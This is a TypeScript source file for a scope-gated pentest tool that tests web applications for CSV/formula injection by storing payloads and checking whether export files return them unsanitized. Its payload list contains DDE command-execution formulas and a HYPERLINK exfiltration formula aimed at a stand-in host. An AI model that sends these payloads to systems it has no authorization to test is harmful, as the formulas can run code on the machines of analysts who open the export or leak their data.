// csvInject.ts — CSV/formula injection prover (write/confirm tool `csv_inject`,
// CWE-1236). A stored value that a spreadsheet later EVALUATES as a formula is
// code execution on the analyst's machine: `=cmd|' /C calc'!A1` (DDE), `=HYPERLINK`
// exfil, `@SUM`/`+`/`-`/tab/CR prefixes that Excel/Sheets still interpret.
//
// Honest two-hop detection — BOTH hops must be observed by THIS tool:
//   Hop 1 (inject): the payload must be STORED (create/update through the
//     target endpoint) — a pure echo in the same response is NOT stored and
//     the run says so instead of claiming.
//   Hop 2 (export): a same-origin export endpoint (args.export_url, or the
//     tool auto-probes common export paths) must return the payload INSIDE a
//     spreadsheet-ish artifact (csv/tsv/xls/xlsx/ods attachment or content)
//     WITHOUT the sanitizing prefix (' or tab) that the export is supposed to
//     add. Stored-but-sanitized = honest negative (defense works).
//
// Scope-gated (every URL via targetAllowed), bounded ≤8 requests, politeDelay,
// recordHttp everywhere, session support. Sinyal → poc_verify → finding_add.
// (Opening the exported file on a victim machine is out of scope — the tool
// proves the unsanitized formula ROUND-TRIP, the human completes the click.)
import { targetAllowed, politeDelay } from "./security";
import { recordHttp } from "./httpHistory";
import { sessionHeaders } from "./httpSession";

const UA = "mia-assistant/1.0";
const BODY_BUDGET = 24_000;
const MAX_REQ = 8;

/** Marker string — unique, safe, ties the stored value to this run. */
export function csvMarker(seed: string): string {
  let h = 0;
  for (const ch of seed) h = (h * 31 + ch.charCodeAt(0)) >>> 0;
  return `mia${(h % 1e6).toString().padStart(6, "0")}`;
}

/** Formula payloads: DDE-ish, hyperlink exfil shape, and prefix interpreters. */
export const FORMULA_PAYLOADS: Array<{ p: string; kind: string }> = [
  { p: "=cmd|' /C calc'!A0", kind: "DDE command" },
  { p: "=HYPERLINK(\"http://evil.example/leak\",\"click\")", kind: "HYPERLINK exfil" },
  { p: "=2+5+cmd|' /C calc'!A0", kind: "arithmetic DDE" },
  { p: "@SUM(1+2)*cmd|' /C calc'!A0", kind: "@-prefix DDE" },
  { p: "\t=cmd|' /C calc'!A0", kind: "tab-prefix formula" },
  { p: "+cmd|' /C calc'!A0", kind: "plus-prefix formula" },
];

/**
 * Classify an exported artifact. Pure — tested.
 * - `sanitized` wins when EVERY occurrence carries the export's escape prefix
 *   (apostrophe / tab) — defense works.
 * - `raw` when the marker rides a formula character unescaped → LEAD.
 * - `absent` when the stored marker never reached the export (hop 2 broken —
 *   the tool reports it honestly instead of inventing an impact).
 */
export function classifyExport(
  body: string,
  marker: string,
  contentType?: string,
  disposition?: string
): { verdict: "raw" | "sanitized" | "absent"; spreadsheet: boolean; detail: string } {
  const ct = (contentType || "").toLowerCase();
  const cd = (disposition || "").toLowerCase();
  const spreadsheetish = /csv|spreadsheet|excel|ms-excel|openxml|officedocument|oasis|tab-separated/.test(ct)
    || /\.(csv|tsv|xls|xlsx|ods)(\?|$)/.test(cd) || /filename="[^"]*\.(csv|tsv|xlsx?|ods)"/.test(cd);
  const b = body || "";
  if (!b.includes(marker)) return { verdict: "absent", spreadsheet: spreadsheetish, detail: "marker tidak ada di export (payload tidak tersimpan / tidak terekspor)" };
  const formulaRides = /(^|[,\n;])([=@+]|@|\t)=?[^,\n]*mia[0-9]{6}/im.test(b.replace(/'/g, "|SANTITIZED|").replace(marker, marker)) || false;
  // simpler + honest: count raw vs sanitized occurrences
  const all = b.split(marker).length - 1;
  const sanitized = b.split(`'${marker}`).length - 1 + b.split(`\t${marker}`).length - 1 + b.split(`"${marker}`).length - 1;
  const raw = all - sanitized;
  if (raw > 0) return { verdict: "raw", spreadsheet: spreadsheetish, detail: `${raw}/${all} kemunculan marker TANPA escape prefix (formula utuh ikut ter-ekspor)${formulaRides ? " — shape formula terdeteksi" : ""}` };
  return { verdict: "sanitized", spreadsheet: spreadsheetish, detail: `semua ${all} kemunculan marker di-escape (${sanitized} ber-prefix sanitasi) — defense bekerja` };
}

/** Common export paths probed when no export_url is given. */
export const EXPORT_PATHS = [
  "/export", "/export/csv", "/api/export", "/api/export/csv",
  "/download", "/download/csv", "/report/export", "/users/export",
];

async function send(
  url: string,
  method: "GET" | "POST",
  body: string | undefined,
  contentType: string | undefined,
  session: string | undefined,
  rawUser: unknown
): Promise<{ status: number; body: string; ms: number; error?: string; contentType?: string; disposition?: string }> {
  const headers: Record<string, string> = { "User-Agent": UA };
  if (session && rawUser) {
    const s = sessionHeaders(rawUser, session);
    if (s) {
      Object.assign(headers, s.headers);
      if (s.cookie && !Object.keys(headers).some((k) => k.toLowerCase() === "cookie")) headers.cookie = s.cookie;
    }
  }
  if (body !== undefined) headers["content-type"] = contentType || "application/x-www-form-urlencoded";
  const t0 = Date.now();
  try {
    const res = await fetch(url, { method, headers, body, redirect: "manual", signal: AbortSignal.timeout(12_000) });
    return {
      status: res.status,
      body: (await res.text()).slice(0, BODY_BUDGET),
      ms: Date.now() - t0,
      contentType: res.headers.get("content-type") || undefined,
      disposition: res.headers.get("content-disposition") || undefined,
    };
  } catch (e) {
    return { status: 0, body: "", ms: Date.now() - t0, error: e instanceof Error ? e.message : String(e) };
  }
}

export type CsvInjectOpts = {
  url?: string;            // endpoint that STORES the value (create/update)
  method?: string;         // default POST
  field?: string;          // field receiving the payload (default "name")
  extra_fields?: string;   // "k=v" comma list appended to every store request
  export_url?: string;     // explicit export endpoint (else common paths probed)
  placement?: string;      // form (default) | json
  session?: string;
  payload?: string;        // custom formula (default FORMULA_PAYLOADS[0])
};

/**
 * CSV/formula injection prover. Bounded ≤8 requests, honest verdicts:
 * RAW-IN-EXPORT lead needs store + unsanitized export; every other path is a
 * controlled negative (sanitized export = defense works; absent marker = the
 * round-trip never happened — never claimed).
 */
export async function csvInject(rawUser: unknown, opts: CsvInjectOpts = {}): Promise<string> {
  const raw = String(opts.url || "").trim();
  if (!/^https?:\/\//i.test(raw)) return "Error: url harus http(s).";
  if (!targetAllowed(raw)) return "Error: SCOPE — csv_inject hanya untuk lab / engagement aktif / PENTEST_LAB_TARGETS.";
  let base: URL;
  try { base = new URL(raw); } catch { return "Error: URL tidak valid."; }
  const method: "GET" | "POST" = (opts.method || "POST").toUpperCase() === "GET" ? "GET" : "POST";
  const field = String(opts.field || "name").trim() || "name";
  const placement: "form" | "json" = String(opts.placement || "form") === "json" ? "json" : "form";
  const session = typeof opts.session === "string" && opts.session ? opts.session : undefined;
  const payload = String(opts.payload || FORMULA_PAYLOADS[0].p);
  const marker = csvMarker(String(opts.session || "") + field + payload);
  const storedValue = `${marker}|${payload}`;

  const extras: Array<[string, string]> = String(opts.extra_fields || "")
    .split(",").map((s) => s.trim()).filter(Boolean)
    .map((kv) => { const i = kv.indexOf("="); return i > 0 ? [kv.slice(0, i), kv.slice(i + 1)] as [string, string] : null; })
    .filter((x): x is [string, string] => !!x);

  const build = (value: string): { body: string; contentType: string } => {
    if (placement === "json") {
      const obj: Record<string, string> = { [field]: value };
      for (const [k, v] of extras) obj[k] = v;
      return { body: JSON.stringify(obj), contentType: "application/json" };
    }
    const sp = new URLSearchParams();
    sp.set(field, value);
    for (const [k, v] of extras) sp.set(k, v);
    return { body: sp.toString(), contentType: "application/x-www-form-urlencoded" };
  };

  let used = 0;
  const leads: string[] = [];
  const notes: string[] = [];

  // ---- Hop 1: STORE the formula payload (with marker). ----
  await politeDelay();
  const storeBody = build(storedValue);
  const store = await send(base.toString(), method, storeBody.body, storeBody.contentType, session, rawUser);
  used++;
  recordHttp(rawUser, { method, url: base.toString(), status: store.status, bytes: store.body.length, ms: store.ms, at: new Date().toISOString() });
  if (store.error) return `Error: store gagal jaringan (${store.error}) — target down / salah endpoint.`;
  if (store.status >= 400) {
    notes.push(`store menjawab ${store.status} — payload mungkin tidak tersimpan (tetap diuji lewat export bila endpoint disediakan).`);
  } else if (store.body.includes(storedValue)) {
    notes.push("payload terpantul UTUH di respons store (echo) — pantulan bukan bukti tersimpan; hop export yang menentukan.");
  }

  // ---- Hop 2: EXPORT and classify. ----
  const exportCandidates = String(opts.export_url || "").trim()
    ? [String(opts.export_url).trim()]
    : EXPORT_PATHS.map((p) => `${base.origin}${p}`);
  for (const cand of exportCandidates.slice(0, used >= MAX_REQ - exportCandidates.length ? 1 : 4)) {
    if (used >= MAX_REQ) break;
    if (!targetAllowed(cand)) { notes.push(`export ${cand} di luar izin — dilewati.`); continue; }
    await politeDelay();
    const ex = await send(cand, "GET", undefined, undefined, session, rawUser);
    used++;
    recordHttp(rawUser, { method: "GET", url: cand, status: ex.status, bytes: ex.body.length, ms: ex.ms, at: new Date().toISOString() });
    if (ex.error || ex.status === 0) { notes.push(`export gagal jaringan (${ex.error || "no status"}).`); continue; }
    if (ex.status >= 400) { notes.push(`export ${new URL(cand).pathname} → ${ex.status} (tidak tersedia).`); continue; }
    const cls = classifyExport(ex.body, marker, ex.contentType, ex.disposition);
    if (cls.verdict === "raw" && cls.spreadsheet) {
      leads.push(`CSV/FORMULA-INJECTION — formula tersimpan DAN terekspor MENTAH ke spreadsheet (${new URL(cand).pathname}, ${cls.detail}). Payload: ${JSON.stringify(payload.slice(0, 40))}. Buka file = kode jalan di mesin korban.`);
      break;
    }
    if (cls.verdict === "raw") {
      leads.push(`FORMULA TERSIMPAN MENTAH (non-spreadsheet) — ${new URL(cand).pathname}: ${cls.detail} (bukan artifact spreadsheet; bukti lemah, tetap layak dicek).`);
      break;
    }
    if (cls.verdict === "sanitized") {
      notes.push(`export ${new URL(cand).pathname}: ${cls.detail}.`);
      continue;
    }
    notes.push(`export ${new URL(cand).pathname}: marker tidak ditemukan (hop putus — payload tidak sampai artifact).`);
  }

  const head = `📋 CSV INJECT ${base.origin}${base.pathname} — ${used} request (budget ${MAX_REQ}), ${leads.length} LEAD.`;
  const lines = leads.map((l) => `• ${l}`);
  const tail = leads.length
    ? "⚠️ Sinyal → poc_verify (simpan ulang + export ulang, deterministik) sebelum finding_add (CWE-1236). Tool TIDAK membuka file di mesin siapa pun — klik oleh korban ada di luar bukti otomatis."
    : `Tidak ada round-trip formula yang terbukti. ${notes.join(" ")} (Negatif ≠ aman; bila export butuh UI/param khusus, berikan export_url eksplisit.)`;
  return [head, ...lines, "", tail].join("\n");
}
